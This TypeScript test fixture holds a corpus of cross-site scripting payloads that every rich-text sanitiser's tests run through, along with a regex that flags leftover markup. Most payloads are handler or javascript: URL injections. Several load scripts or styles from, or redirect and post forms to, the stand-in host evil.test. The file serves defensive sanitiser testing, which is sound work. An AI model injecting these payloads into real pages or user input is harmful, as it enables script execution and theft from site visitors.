// Payloads an editor might paste, or a bad row might hold: one corpus
// shared by every rich-text sanitiser's tests. A test puts
// each payload into every string field a profile keeps, sanitises, and
// checks that no string left in the result looks like markup.
//
// Test data only: no production module imports this file.

export const XSS_CORPUS = [
  "<script>alert(1)</script>",
  "<SCRIPT SRC=//evil.test/x.js></SCRIPT>",
  '<img src=x onerror="alert(1)">',
  "<img src=x onerror=alert(1)",
  '<svg onload="alert(1)"><circle /></svg>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<object data="data:text/html,<script>alert(1)</script>"></object>',
  "<style>@import 'https://evil.test/x.css';</style>",
  '<a href="javascript:alert(1)">click</a>',
  '<a href="jav&#x61;script:alert(1)">click</a>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<img srcset="x 1x, javascript:alert(1) 2x">',
  "<template><img src=x onerror=alert(1)></template>",
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<base href="https://evil.test/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.test/">',
  '<form action="https://evil.test/"><button>go</button></form>',
  "<scr<script>ipt>alert(1)</script>",
  "<!--<img src=x onerror=alert(1)>-->",
] as const;

/** Anything a browser could read as a tag, a handler or a script URL. */
export const LOOKS_LIKE_MARKUP =
  /<\s*\/?\s*[a-z!?]|on[a-z]+\s*=|javascript:|vbscript:/i;

/** Every string anywhere inside `value`, keys excluded. */
export function stringsIn(value: unknown): string[] {
  if (typeof value === "string") return [value];
  if (Array.isArray(value)) return value.flatMap(stringsIn);
  if (typeof value === "object" && value !== null)
    return Object.values(value).flatMap(stringsIn);
  return [];
}
